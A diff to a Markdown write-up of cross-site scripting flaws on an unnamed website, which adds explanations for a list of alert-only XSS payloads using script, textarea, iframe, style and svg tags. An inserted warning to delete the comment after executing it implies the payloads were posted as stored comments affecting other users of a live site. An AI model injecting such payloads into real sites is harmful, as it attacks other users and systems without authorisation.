@@ -10,6 +10,8 @@ This section documents the XXS vulnerabilities identified in the website []. The
 
 ## XSS payloads
 
+PLEASE DELETE A COMMENT AFTER THE EXECUTIONS OF THIS COMMENT.WHICH AFFECT THE ANOTHER USER AND YOUR EXPRIENCE.
+
 ### 1. Simple Script Alert:
 ```HTML
 <script>alert(\'SCRIPT ALERT\');</script>
@@ -63,18 +65,25 @@ Explanation: This payload uses an <a> (anchor) tag with an onclick event handler
 
 ### 9. Textarea Tag:
 ```HTML
-<textarea onfocus="alert(\'XSS\')">Focus on me</textarea>
+<textarea onfocus="alert(\'YOU CAN NOT OVERWRITE\')">Focus on me</textarea>
 ```
-Explanation: This payload uses a <textarea> tag with an onfocus event handler. When the user focuses on the textarea (e.g., clicks on it), the browser executes the JavaScript code, causing an alert with the message "XSS".
+Explanation: This payload uses a <textarea> tag with an onfocus event handler. When the user focuses on the textarea (e.g., clicks on it), the browser executes the JavaScript code, causing an alert with the message "YOU CAN NOT OVERWRITE".
+Note : After execution of this comment, if you receive alert message continously just reload the page.
 
-10. Iframe Tag:
+### 10. Iframe Tag:
+```HTML
+<iframe src="javascript:alert(\'New Website availble in comment\')"></iframe>
+```
+Explanation: This payload uses an <iframe> tag with a src attribute set to a JavaScript URI. When the iframe loads, the browser executes the JavaScript code, causing an alert with the message "New Website availble in comment".
 
-<iframe src="javascript:alert('XSS')"></iframe>
+### 11. Style Tag with JavaScript:
+```HTML
+<style>body{background:url("javascript:alert(\'Background Hacked\')");}</style>
+```
+Explanation: This payload uses a <style> tag to inject CSS that sets the background of the <body> to a JavaScript URI. When the browser parses the CSS, it executes the JavaScript code, causing an alert with the message "Background Hacked".
 
-11. Style Tag with JavaScript:
-
-<style>body{background:url("javascript:alert('XSS')");}</style>
-
-12. SVG with Embedded JavaScript:
-
-<svg><script>alert('XSS')</script></svg>
+### 12. SVG with Embedded JavaScript:
+```HTML
+<svg><script>alert(\'SVG executed\')</script></svg>
+```
+Explanation: This payload uses an <svg> tag to embed an <script> tag. When the SVG is loaded, the browser executes the JavaScript code inside the <script> tag, causing an alert with the message "SVG executed".
